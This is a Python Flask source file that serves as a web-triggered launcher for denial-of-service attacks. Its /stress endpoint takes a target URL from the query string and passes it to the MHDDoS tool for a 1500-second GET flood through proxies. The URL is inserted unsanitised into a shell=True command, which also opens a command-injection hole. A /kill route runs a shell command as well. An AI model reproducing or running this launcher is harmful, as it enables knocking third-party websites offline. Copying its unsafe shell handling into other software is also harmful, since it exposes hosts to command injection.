from flask import Flask, render_template, request
import subprocess
import re

app = Flask(__name__)

#bot_process = subprocess.Popen(['python3' , 'bot.py'])
  
def ddos_start(url):
  s= 1500
  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)

  


@app.route("/")
def page_web_de_mort():
 #   bot_process
    return "<html><body><img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'></body></html>"
    #page_web_de_mort()
    
@app.route("/kill")
def killswitch():
    p = subprocess.Popen(f'refresh', stdout=subprocess.PIPE, shell=True)
    output, error = p.communicate()
  #  bot_process
    return "<html><body><img src='https://i.giphy.com/6jTD6KqVNADI746GOC.gif'></body></html>"
    #page_web_de_mort()   
    
    
@app.route(f"/stress")
def ddos():
  
    full_url = str(request.args)
    data = full_url.replace("ImmutableMultiDict([('", '')
    url = data.replace("', '')])", '')
   
    print(url)
  
    ddos_start(url)

    return "<html><body><img src='https://i.giphy.com/6jTD6KqVNADI746GOC.gif'></body></html>"
    #page_web_de_mort() 
    

app.run()
  
  
  
"""

if __name__ == "__main__":
    app.run()

"""